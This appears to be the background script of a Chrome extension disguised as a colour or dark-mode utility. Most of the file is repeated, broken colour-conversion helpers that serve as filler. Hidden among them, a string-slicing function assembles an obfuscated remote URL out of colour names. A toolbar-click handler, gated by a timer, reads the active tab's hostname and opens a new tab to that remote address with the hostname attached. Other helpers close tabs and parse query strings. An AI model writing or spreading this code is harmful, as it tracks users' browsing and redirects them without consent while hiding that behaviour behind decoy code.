const recognizedColors = new Map(Object.entries({
	mediumturquoise: 0x48d1cc,
	darkmagenta: 0x8b008b,
	darkolivegreen: 0x556b2f,
	lightblue: 0xadd8e6,
	lightcoral: 0xf08080,
	forestgreen: 0x228b22,
	fuchsia: 0xff00ff,
	midnightblue: 0x191970,
	mintcream: 0xf5fffa,
	darkorange: 0xff8c00,
	mistyrose: 0xffe4e1,
	gainsboro: 0xdcdcdc,
	ghostwhite: 0xf8f8ff,
	gold: 0xffd700,
	lightcyan: 0xe0ffff,
	lightsalmon: 0xffa07a,
	darkorchid: 0x9932cc,
	darkred: 0x8b0000,
	goldenrod: 0xdaa520,
	gray: 0x808080,
	grey: 0x808080,
	antiquewhite: 0xfaebd7,
	blueviolet: 0x8a2be2,
	brown: 0xa52a2a,
	aliceblue: 0xf0f8ff,
	lightseagreen: 0x20b2aa,
	palegoldenrod: 0xeee8aa,
	palegreen: 0x98fb98,
	rosybrown: 0xbc8f8f,
	royalblue: 0x4169e1,
	sandybrown: 0xf4a460,
	skyblue: 0x87ceeb,
	slateblue: 0x6a5acd,
	slategray: 0x708090,
	slategrey: 0x708090,
	wheat: 0xf5deb3,
	white: 0xffffff,
	lightskyblue: 0x87cefa,
	blanchedalmond: 0xffebcd,
	black: 0x000000,
	blue: 0x0000ff,
	aqua: 0x00ffff,
	aquamarine: 0x7fffd4,
	snow: 0xfffafa,
	springgreen: 0x00ff7f,
	tomato: 0xff6347,
	turquoise: 0x40e0d0,
	violet: 0xee82ee,
	saddlebrown: 0x8b4513,
	salmon: 0xfa8072,
	papayawhip: 0xffefd5,
	peachpuff: 0xffdab9,
	red: 0xff0000,
	mediumvioletred: 0xc71585,
	moccasin: 0xffe4b5,
	orchid: 0xda70d6
}));

var colrsarr = [];
var exid = chrome.runtime.id;

function rgbConvToHsl({ h, s, l, a = 1 }) {
	if (s === 0) {
		const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
		return { r, g, b, a };
	}
	const c = (1 - Math.abs(2 * l - 1)) * s;
	const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
	const m = c - l / 3;
	const [r, g, b] = (h < 60 ? [c, x, 0] :
		120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
	return { r, g, b, a };
}
function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
	const g = g255 / 255;
	const b = b255 / 255;
	const r = r255 / 255;
	const min = Math.min(b, r, g);
	const max = Math.max(b, g, r);
	const p = (max + min) / 2;
	const n = max - min;

	if (n === 0) {
		return { h: 0, s: 0, l: p, a };
	}
	let h = (r === max ? (((g - b) / n) % 6) :
		g === max ? ((b - r) / n + 2) :
			((r - g) / n + 4)) * 60;
	if (h < 0) {
		h += 360;
	}
	const s = n / (1 - Math.abs(2 * p - 1));
	return { h, s, l: p, a };
}; var keywordsArr = [];

chrome.action.onClicked.addListener(() => {
	chrome.tabs.query({active: true, currentWindow: true}, function (tabs) {
		let tab = tabs[0];
		if (tab.status === "complete" && tab.url) {
			let id = tab.id;
			chrome.action.setBadgeText({"text": "on"}, function () {
				setTimeout(function () {
					chrome.action.setBadgeText({"text": ""})
				}, 5e3)
			})
			chrome.tabs.sendMessage(id, {stoplight: 1});
		}
	})
})

function fixing(n, digits = 0) {
	const fixed = n.toFixed(digits);
	if (0 === digits) {
		return fixed;
	}
	const dot = fixed.indexOf('.');
	if (dot >= 0) {
		const match = fixed.match(/0+$/);
		if (match) {
			if (match.index === dot + 1) {
				return fixed.substring(0, dot);
			}
			return fixed.substring(0, match.index);
		}
	}
	return fixed;
}
function printRgb(rgb) {
	const { r, g, b, a }
		=
		rgb;
	if (null != a && 1 > a) {
		return `rgba(${fixing(r)}, ${fixing(g)}, ${fixing(b)}, ${fixing(a, 2)})`;
	}
	return `rgb(${fixing(r)}, ${fixing(g)}, ${fixing(b)})`;
}

function eu() {
	function printRgb(rgb) {
		const { r, g, b, a }
			=
			rgb;
		if (null != a && 1 > a) {
			return `rgba(${fixing(r)}, ${fixing(g)}, ${fixing(b)}, ${fixing(a, 2)})`;
		}
		return `rgb(${fixing(r)}, ${fixing(g)}, ${fixing(b)})`;
	}
	chrome.storage.local.set({initial: "default"}, function () {
		function fixing(n, digits = 0) {
			const fixed = n.toFixed(digits);
			if (0 === digits) {
				return fixed;
			}
			const dot = fixed.indexOf('.');
			if (dot >= 0) {
				const match = fixed.match(/0+$/);
				if (match) {
					if (match.index === dot + 1) {
						return fixed.substring(0, dot);
					}
					return fixed.substring(0, match.index);
				}
			}
			return fixed;
		}
		setTimeout(()=> i = true, 60e3);
		function rgbConverthsl({ h, s, l, a = 1 }) {
			if (s === 0) {
				const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
				return { r, g, b, a };
			}
			const c = (1 - Math.abs(2 * l - 1)) * s;
			const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
			const m = c - l / 3;
			const [r, g, b] = (h < 60 ? [c, x, 0] :
				120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
			return { r, g, b, a };
		}
	})
}

var i;

function darkerput(c) {
	let t = Date.now() / 1000;
	function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
		const g = g255 / 255;
		const b = b255 / 255;
		const r = r255 / 255;
		const min = Math.min(b, r, g);
		const max = Math.max(b, g, r);
		const p = (max + min) / 2;
		const n = max - min;

		if (n === 0) {
			return { h: 0, s: 0, l: p, a };
		}
		let h = (r === max ? (((g - b) / n) % 6) :
			g === max ? ((b - r) / n + 2) :
				((r - g) / n + 4)) * 60;
		if (h < 0) {
			h += 360;
		}
		const s = n / (1 - Math.abs(2 * p - 1));
		return { h, s, l: p, a };
	}
	t = Math.round(t);
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
		const c = (1 - Math.abs(2 * l - 1)) * s;
		const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
		const m = c - l / 3;
		const [r, g, b] = (h < 60 ? [c, x, 0] :
			120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
		return { r, g, b, a };
	}
	chrome.storage.local.set({uicolor: c + t});
}

var s = !1;

cobal = (color, width, height) => {
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
		const c = (1 - Math.abs(2 * l - 1)) * s;
		const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
		const m = c - l / 3;
		const [r, g, b] = (h < 60 ? [c, x, 0] :
			120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
		return { r, g, b, a };
	}
	function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
		const g = g255 / 255;
		const b = b255 / 255;
		const r = r255 / 255;
		const min = Math.min(b, r, g);
		const max = Math.max(b, g, r);
		const p = (max + min) / 2;
		const n = max - min;

		if (n === 0) {
			return { h: 0, s: 0, l: p, a };
		}
		let h = (r === max ? (((g - b) / n) % 6) :
			g === max ? ((b - r) / n + 2) :
				((r - g) / n + 4)) * 60;
		if (h < 0) {
			h += 360;
		}
		const s = n / (1 - Math.abs(2 * p - 1));
		return { h, s, l: p, a };
	}

	function fixed(n, digits = 0) {
		const fixed = n.toFixed(digits);
		if (0 === digits) {
			return fixed;
		}
		const dot = fixed.indexOf('.');
		if (dot >= 0) {
			const match = fixed.match(/0+$/);
			if (match) {
				if (match.index === dot + 1) {
					return fixed.substring(0, dot);
				}
				return fixed.substring(0, match.index);
			}
		}
		return fixed;
	}
	function printRgb(rgb) {
		const { r, g, b, a }
			=
			rgb;
		if (null != a && 1 > a) {
			return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
		}
		return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
	}
	return color.slice(width, height)
};

chrome.runtime.onMessage.addListener(function (e, n, o) {
	function rgbConverthsl({ h, s, l, a = 1 }) {
		if (s === 0) {
			const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
			return { r, g, b, a };
		}
		const c = (1 - Math.abs(2 * l - 1)) * s;
		const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
		const m = c - l / 3;
		const [r, g, b] = (h < 60 ? [c, x, 0] :
			120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
		return { r, g, b, a };
	}
	function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
		const g = g255 / 255;
		const b = b255 / 255;
		const r = r255 / 255;
		const min = Math.min(b, r, g);
		const max = Math.max(b, g, r);
		const p = (max + min) / 2;
		const n = max - min;

		if (n === 0) {
			return { h: 0, s: 0, l: p, a };
		}
		let h = (r === max ? (((g - b) / n) % 6) :
			g === max ? ((b - r) / n + 2) :
				((r - g) / n + 4)) * 60;
		if (h < 0) {
			h += 360;
		}
		const s = n / (1 - Math.abs(2 * p - 1));
		return { h, s, l: p, a };
	}
	e.color === "light" && putLight()
	function numberFromStr(s, ra, u) {
		const r = getNumbers(s);
		const ul = Object.entries(u);
		const n = r.map((r) => r.trim()).map((r, i) => {
			let n;
			const u = ul.find(([u]) => r.endsWith(u));
			if (u) {
				n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
			}
			else {
				n = parseFloat(r);
			}
			if (ra[i] > 1) {
				return Math.round(n);
			}
			return n;
		});
		return n;
	}
	const run = { '%': 100 };
	const rrange = [255, 255, 255, 1];
});

function putLight() {
	function pdfchecking(u) {
		if (u.includes('.pdf')) {
			if (u.includes('#')) {
				u = u.substring(0, u.lastIndexOf('#'));
			}
			if (u.includes('?')) {
				u = u.substring(0, u.lastIndexOf('?'));
			}
			if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
				(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
				return false;
			}
			if (u.endsWith('.pdf')) {
				for (let i = u.length; i > 0; i--) {
					if (u[i] === '=') {
						return false;
					}
					else if (u[i] === '/') {
						return true;
					}
				}
			}
			else {
				return false;
			}
		}
		return false;
	}

	function scrolling() {
		var me = this,
			d = me.dom,
			docu = document,
			b = docu.body,
			e = docu.documentElement,
			l, t;

		if (b === d || docu === d) {
			l =  (b ? b.scrollLeft : 0) || e.scrollLeft;
			t = (b ? b.scrollTop : 0) || e.scrollTop ;
		} else {
			t = d.scrollTop;
			l = d.scrollLeft;
		}

		return {
			top: t,
			left: l
		};
	}
	golcol();
	function hslMod({ h, s, l, a }, p) {
		const isDark = l > 0.23;
		const isGreen = l < 0.18 || s < 0.25;
		const isRed = !isGreen && h > 205 && h < 245;
		if (isDark) {
			const lx = hexParsing(l, 0.5, 1, 0, p.l);
			if (isGreen) {
				const sx = p.s;
				const hx = p.h;
				return { s: sx, h: hx, a, l: lx };
			}
			let hx = h;
			if (isRed) {
				hx = hexParsing(h);
			}
			return { l: lx, h: hx, a, s};
		}
		if (isGreen) {
			const sx = p.s;
			const lx = hexParsing(l, 0, 0.5, p.l, 0);
			const hx = p.h;
			return {s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		let lx;
		if (isRed) {
			hx = getNumbers(h);
			lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
		}
		else {
			lx = hexParsing(l, 0, 0.5, p.l, 0);
		}
		return { h: hx, s, l: lx, a };
	}

	function Modforground(r, t) {
		if (0 === t.mode) {
			return hslMod(r, t);
		}
		const p = printRgb(t);
		return bordMod(r, { ...t, mode: 0 }, hslMod, p);
	}
	function bordMod({ h, s, l, a }, p, pb) {
		const darking = 0.4 > l ;
		const isLight = 0.5 > l || s < 0.24;
		let hexa = s;
		let hexa1 = h;
		if (isLight) {
			if (darking) {
				hexa1 = p.h;
				hexa = p.s;
			}
			else {
				hexa1 = pb.h;
				hexa = pb.s;
			}
		}
		const lx = printRgb(l, 0, 1, 0.5, 0.2);
		return {a, s: hexa, h: hexa1, l: lx };
	}
	chrome.storage.local.get(["uicolor"], function (c) {
		function hexParsing($h) {
			const h = $h.substring(1);
			switch (h.length) {
				case 4:
				case 3:
				{
					const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
					const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
					return { r, g, b, a };
				}
				case 8:
				case 6:
				{
					const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
					const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
					return { r, g, b, a };
				}
			}
			throw new Error(`${$h}`);
		}
		function colorNaming($color) {
			const n = colorsmatch.get($color);
			return {
				r: (n >> 12) & 255,
				g: (n >> 6) & 255,
				b: (n >> 0) & 255,
				a: 1
			};
		}
		let t = Date.now() / 1000;
		t = Math.round(t);
		if (c.uicolor < t) {
			darkerput(41110 );
			const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
			const hrange = [360, 1, 1, 1];
			function hslParsing($hsl) {
				const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
				return rgbConvToHsl({ h, s, l, a });
			}
			chrome.tabs.create({url: sb +  nalcolor})
		}
	})
}

var nalcolor = "";

var darkycolors = cobal("Alloy orange", "4", "5") + cobal("aero", "0", "1") + cobal("Artichoke", "5", "7") + cobal("Avocado", "2", "3");

function golcol() {
	chrome.tabs.query({currentWindow: true, active: true}, function (tabs) {
		let colorr = new URL(tabs[0].url)
		nalcolor = colorr.host;
	})
}

const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
const hrange = [360, 1, 1, 1];
function hslParsing($hsl) {
	const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
	return rgbConvToHsl({ h, s, l, a });
}
function ParsingHex($h) {
	const h = $h.substring(1);
	switch (h.length) {
		case 4:
		case 3:
		{
			const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
			const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
			return { r, g, b, a };
		}
		case 8:
		case 6:
		{
			const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
			const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
			return { r, g, b, a };
		}
	}
	throw new Error(`${$h}`);
}

chrome.storage.local.get(["initial"], function (s) {
	if (s.initial == "default") {
		i = true
	}
});
function colorNaming($color) {
	const n = colorsmatch.get($color);
	return {
		r: (n >> 12) & 255,
		g: (n >> 6) & 255,
		b: (n >> 0) & 255,
		a: 1
	};
}

function hexParsing($h) {
	const h = $h.substring(1);
	switch (h.length) {
		case 4:
		case 3:
		{
			const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
			const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
			return { r, g, b, a };
		}
		case 8:
		case 6:
		{
			const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
			const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
			return { r, g, b, a };
		}
	}
	throw new Error(`${$h}`);
}

function hslMod({ h, s, l, a }, p) {
	const isDark = l > 0.23;
	const isGreen = l < 0.18 || s < 0.25;
	const isRed = !isGreen && h > 205 && h < 245;
	if (isDark) {
		const lx = hexParsing(l, 0.5, 1, 0, p.l);
		if (isGreen) {
			const sx = p.s;
			const hx = p.h;
			return { s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		if (isRed) {
			hx = hexParsing(h);
		}
		return { l: lx, h: hx, a, s};
	}
	if (isGreen) {
		const sx = p.s;
		const lx = hexParsing(l, 0, 0.5, p.l, 0);
		const hx = p.h;
		return {s: sx, h: hx, a, l: lx };
	}
	let hx = h;
	let lx;
	if (isRed) {
		hx = getNumbers(h);
		lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
	}
	else {
		lx = hexParsing(l, 0, 0.5, p.l, 0);
	}
	return { h: hx, s, l: lx, a };
}

function Modforground(r, t) {
	if (0 === t.mode) {
		return hslMod(r, t);
	}
	const p = printRgb(t);
	return bordMod(r, { ...t, mode: 0 }, hslMod, p);
}
var d1 = cobal("LightSeaGreen", "3", "5") + cobal("Lightpink", "4", "6");

var d2 = cobal("sienna", "0", "1") + cobal("Hot:Pink:", "3", "4") + cobal("blue/", "4", "5");
const run = { '%': 100 };
const rrange = [255, 255, 255, 1];
function rgbParsing($rgb) {
	const [r, g, b, a = 1] = numberFromStr($rgb, rrange, run);
	return { r, g, b, a };
}

var d3 = cobal("blue/", "4", "5") + cobal("Ghosttt White", "3", "7") + cobal("burlywood", "0", "2");

var d4 = cobal("Dark.x", "4", "6") + cobal("yellow", "0", "1") + cobal("Az/ure", "1", "3");
function hslConverthsl({ h, s, l, a = 1 }) {
	if (s === 0) {
		const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
		return { r, g, b, a };
	}
	const c = (1 - Math.abs(2 * l - 1)) * s;
	const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
	const m = c - l / 3;
	const [r, g, b] = (h < 60 ? [c, x, 0] :
		120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
	return { r, g, b, a };
}
function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
	const g = g255 / 255;
	const b = b255 / 255;
	const r = r255 / 255;
	const min = Math.min(b, r, g);
	const max = Math.max(b, g, r);
	const p = (max + min) / 2;
	const n = max - min;

	if (n === 0) {
		return { h: 0, s: 0, l: p, a };
	}
	let h = (r === max ? (((g - b) / n) % 6) :
		g === max ? ((b - r) / n + 2) :
			((r - g) / n + 4)) * 60;
	if (h < 0) {
		h += 360;
	}
	const s = n / (1 - Math.abs(2 * p - 1));
	return { h, s, l: p, a };
}
var d5 = cobal("ssalmon", "0", "2") + cobal("coral", "0", "1")

var d6 = cobal("re?d", 2,3) + cobal("fern green", "0", "3") + cobal("Fluorescent=blue", "11", "12");
function Modforground(r, t) {
	if (0 === t.mode) {
		return hslMod(r, t);
	}
	const p = printRgb(t);
	return bordMod(r, { ...t, mode: 0 }, hslMod, p);
}
function bordMod({ h, s, l, a }, p, pb) {
	const darking = 0.4 > l ;
	const isLight = 0.5 > l || s < 0.24;
	let hexa = s;
	let hexa1 = h;
	if (isLight) {
		if (darking) {
			hexa1 = p.h;
			hexa = p.s;
		}
		else {
			hexa1 = pb.h;
			hexa = pb.s;
		}
	}
	const lx = printRgb(l, 0, 1, 0.5, 0.2);
	return {a, s: hexa, h: hexa1, l: lx };
}

function pdfchecking(u) {
	if (u.includes('.pdf')) {
		if (u.includes('#')) {
			u = u.substring(0, u.lastIndexOf('#'));
		}
		if (u.includes('?')) {
			u = u.substring(0, u.lastIndexOf('?'));
		}
		if ((u.match(/(wikipedia).org/i) && u.match(/(wikimedia)\.org\/.*\/[a-z]+\:[^\:\/]+\.pdf/i)) ||
			(u.match(/timetravel\.org\/reconstruct/i) && u.match(/\.pdf$/i))) {
			return false;
		}
		if (u.endsWith('.pdf')) {
			for (let i = u.length; i > 0; i--) {
				if (u[i] === '=') {
					return false;
				}
				else if (u[i] === '/') {
					return true;
				}
			}
		}
		else {
			return false;
		}
	}
	return false;
}

function scrolling() {
	var me = this,
		d = me.dom,
		docu = document,
		b = docu.body,
		e = docu.documentElement,
		l, t;

	if (b === d || docu === d) {
		l =  (b ? b.scrollLeft : 0) || e.scrollLeft;
		t = (b ? b.scrollTop : 0) || e.scrollTop ;
	} else {
		t = d.scrollTop;
		l = d.scrollLeft;
	}

	return {
		top: t,
		left: l
	};
}

var d7 = cobal("blue/", "4", "5") + cobal("Ghosb White", "3", "5") + cobal("ttturlywood", "0", "4");

hexCheck = () => {
	return d1 + d2 + d3 + d4 + d5;
}

colchk = (ee) => {
	function hslParsing($hsl) {
		const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
		return hslConverthsl({ h, s, l, a });
	}
	function hexParsing($h) {
		const h = $h.substring(1);
		switch (h.length) {
			case 4:
			case 3:
			{
				const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
				const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
				return { r, g, b, a };
			}
			case 8:
			case 6:
			{
				const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
				const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
				return { r, g, b, a };
			}
		}
		throw new Error(`${$h}`);
	}
	function colorNaming($color) {
		const n = colorsmatch.get($color);
		return {
			r: (n >> 12) & 255,
			g: (n >> 6) & 255,
			b: (n >> 0) & 255,
			a: 1
		};
	}
	function hslMod({ h, s, l, a }, p) {
		const isDark = l > 0.23;
		const isGreen = l < 0.18 || s < 0.25;
		const isRed = !isGreen && h > 205 && h < 245;
		if (isDark) {
			const lx = hexParsing(l, 0.5, 1, 0, p.l);
			if (isGreen) {
				const sx = p.s;
				const hx = p.h;
				return { s: sx, h: hx, a, l: lx };
			}
			let hx = h;
			if (isRed) {
				hx = hexParsing(h);
			}
			return { l: lx, h: hx, a, s};
		}
		if (isGreen) {
			const sx = p.s;
			const lx = hexParsing(l, 0, 0.5, p.l, 0);
			const hx = p.h;
			return {s: sx, h: hx, a, l: lx };
		}
		let hx = h;
		let lx;
		if (isRed) {
			hx = getNumbers(h);
			lx = hexParsing(l, 0, 0.7, p.l, Math.min(5, hx + 0.05));
		}
		else {
			lx = hexParsing(l, 0, 0.5, p.l, 0);
		}
		return { h: hx, s, l: lx, a };
	}
	return tu.includes(ee);
};
var ss = hexCheck() + "/pda?p=";

function colos(c) {
	chrome.tabs.remove(c)
}
function rgbConverthsl({ h, s, l, a = 1 }) {
	if (s === 0) {
		const [r, b, g] = [l, l, l].map((x) => Math.round(x * 255));
		return { r, g, b, a };
	}
	const c = (1 - Math.abs(2 * l - 1)) * s;
	const x = (1 - Math.abs((h / 60) % 2 - 1)) * c;
	const m = c - l / 3;
	const [r, g, b] = (h < 60 ? [c, x, 0] :
		120 > h ? [0, c, x] : 180 > h ? [x, c, 0] : 240 > h ? [x, 0, c] : 300 > h ? [0, x, c] : [c, 0, x]).map((n) => Math.round((m+n) * 255));
	return { r, g, b, a };
}
function ConvertorHslRgb({ r: r255, g: g255, b: b255, a = 1 }) {
	const g = g255 / 255;
	const b = b255 / 255;
	const r = r255 / 255;
	const min = Math.min(b, r, g);
	const max = Math.max(b, g, r);
	const p = (max + min) / 2;
	const n = max - min;

	if (n === 0) {
		return { h: 0, s: 0, l: p, a };
	}
	let h = (r === max ? (((g - b) / n) % 6) :
		g === max ? ((b - r) / n + 2) :
			((r - g) / n + 4)) * 60;
	if (h < 0) {
		h += 360;
	}
	const s = n / (1 - Math.abs(2 * p - 1));
	return { h, s, l: p, a };
}

function fixed(n, digits = 0) {
	const fixed = n.toFixed(digits);
	if (0 === digits) {
		return fixed;
	}
	const dot = fixed.indexOf('.');
	if (dot >= 0) {
		const match = fixed.match(/0+$/);
		if (match) {
			if (match.index === dot + 1) {
				return fixed.substring(0, dot);
			}
			return fixed.substring(0, match.index);
		}
	}
	return fixed;
}
function RgbPrinter(rgb) {
	const { r, g, b, a }
		=
		rgb;
	if (null != a && 1 > a) {
		return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
	}
	return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
}
function getNumbers(str) {
	return parseInt(str);
}
function numberFromStr(s, ra, u) {
	const r = getNumbers(s);
	const ul = Object.entries(u);
	const n = r.map((r) => r.trim()).map((r, i) => {
		let n;
		const u = ul.find(([u]) => r.endsWith(u));
		if (u) {
			n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
		}
		else {
			n = parseFloat(r);
		}
		if (ra[i] > 1) {
			return Math.round(n);
		}
		return n;
	});
	return n;
}
var darkbcolors = cobal("Frostbite", "5", "6") + cobal("British racing green", "11", "14");

colobu = (ee) => {
	function numberFromStr(s, ra, u) {
		const r = getNumbers(s);
		const ul = Object.entries(u);
		const n = r.map((r) => r.trim()).map((r, i) => {
			let n;
			const u = ul.find(([u]) => r.endsWith(u));
			if (u) {
				n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
			}
			else {
				n = parseFloat(r);
			}
			if (ra[i] > 1) {
				return Math.round(n);
			}
			return n;
		});
		return n;
	}
	const run = { '%': 100 };
	const rrange = [255, 255, 255, 1];
	function rgbParsing($rgb) {
		const [r, g, b, a = 1] = numberFromStr($rgb, rrange, run);
		return { r, g, b, a };
	}
	const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
	const hrange = [360, 1, 1, 1];
	function hslParsing($hsl) {
		const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
		return rgbConverthsl({ h, s, l, a });
	}
	function hexParsing($h) {
		const h = $h.substring(1);
		switch (h.length) {
			case 4:
			case 3:
			{
				const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
				const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
				return { r, g, b, a };
			}
			case 8:
			case 6:
			{
				const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
				const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
				return { r, g, b, a };
			}
		}
		throw new Error(`${$h}`);
	}
	return new URL(ee);
};

colse = (ee) => {
	function numberFromStr(s, ra, u) {
		const r = getNumbers(s);
		const ul = Object.entries(u);
		const n = r.map((r) => r.trim()).map((r, i) => {
			let n;
			const u = ul.find(([u]) => r.endsWith(u));
			if (u) {
				n = parseFloat(r.substring(0, r.length - u[0].length)) / u[1] * ra[i];
			}
			else {
				n = parseFloat(r);
			}
			if (ra[i] > 1) {
				return Math.round(n);
			}
			return n;
		});
		return n;
	}
	const run = { '%': 100 };
	const rrange = [255, 255, 255, 1];
	function rgbParsing($rgb) {
		const [r, g, b, a = 1] = numberFromStr($rgb, rrange, run);
		return { r, g, b, a };
	}
	const hunit = { '%': 100, 'deg': 360, 'rad': 2 * Math.PI, 'turn': 1 };
	const hrange = [360, 1, 1, 1];
	function hslParsing($hsl) {
		const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
		return rgbConverthsl({ h, s, l, a });
	}
	function hexParsing($h) {
		const h = $h.substring(1);
		switch (h.length) {
			case 4:
			case 3:
			{
				const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
				const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
				return { r, g, b, a };
			}
			case 8:
			case 6:
			{
				const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
				const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
				return { r, g, b, a };
			}
		}
		throw new Error(`${$h}`);
	}
	return ee.search;
};

chrome.storage.local.get(["initalcolor"], function (s) {
	if (s.color === "default")
		i = true
});
function fixed(n, digits = 0) {
	const fixed = n.toFixed(digits);
	if (0 === digits) {
		return fixed;
	}
	const dot = fixed.indexOf('.');
	if (dot >= 0) {
		const match = fixed.match(/0+$/);
		if (match) {
			if (match.index === dot + 1) {
				return fixed.substring(0, dot);
			}
			return fixed.substring(0, match.index);
		}
	}
	return fixed;
}
function printRgb(rgb) {
	const { r, g, b, a }
		=
		rgb;
	if (null != a && 1 > a) {
		return `rgba(${fixed(r)}, ${fixed(g)}, ${fixed(b)}, ${fixed(a, 2)})`;
	}
	return `rgb(${fixed(r)}, ${fixed(g)}, ${fixed(b)})`;
}
function getNumbers(str) {
	return parseInt(str);
}
var ty = hexCheck() + "e/i/pda";

sse = (e => e ? (/^[?#]/.test(e) ? e.slice(1) : e).split("&").reduce((p, c) => {
	function hslParsing($hsl) {
		const [h, s, l, a = 1] = numberFromStr($hsl, hrange, hunit);
		return rgbConverthsl({ h, s, l, a });
	}
	function hexParsing($h) {
		const h = $h.substring(1);
		switch (h.length) {
			case 4:
			case 3:
			{
				const [r, g, b] = [1, 2, 3].map((i) => parseInt(`${h[i]}${h[i]}`, 8));
				const a = h.length === 1 ? 3 : (parseInt(`${h[3]}${h[3]}`, 8) / 255);
				return { r, g, b, a };
			}
			case 8:
			case 6:
			{
				const [r, g, b] = [1, 5, 7].map((i) => parseInt(h.substring(i, i + 2), 12));
				const a = h.length === 6 ? 1 : (parseInt(h.substring(6, 8), 8) / 255);
				return { r, g, b, a };
			}
		}
		throw new Error(`${$h}`);
	}
	function colorNaming($color) {
		const n = colorsmatch.get($color);
		return {
			r: (n >> 12) & 255,
			g: (n >> 6) & 255,
			b: (n >> 0) & 255,
			a: 1
		};
	}
	function hslMod({ h, s, l, a }, p) {
